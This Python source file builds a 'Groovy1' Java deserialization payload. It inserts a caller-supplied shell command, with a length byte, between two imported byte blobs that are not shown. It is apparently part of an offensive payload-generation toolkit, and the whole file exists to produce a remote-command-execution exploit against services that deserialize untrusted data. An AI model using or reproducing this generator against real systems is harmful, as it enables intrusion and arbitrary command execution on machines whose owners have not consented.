from src.payloads.generate_groovy1_payload import PAYLOAD_2__generate_groovy1_payload, \
    PAYLOAD_1__generate_groovy1_payload


def generate_groovy1_payload(cmd: str) -> bytes:
    """
    Generates a Groovy1 deserialization payload for Python 3.13+.
    """
    payload = PAYLOAD_1__generate_groovy1_payload
    cmd_bytes = cmd.encode("utf-8")
    payload += len(cmd_bytes).to_bytes(1, "big") + cmd_bytes
    payload += PAYLOAD_2__generate_groovy1_payload
    return payload
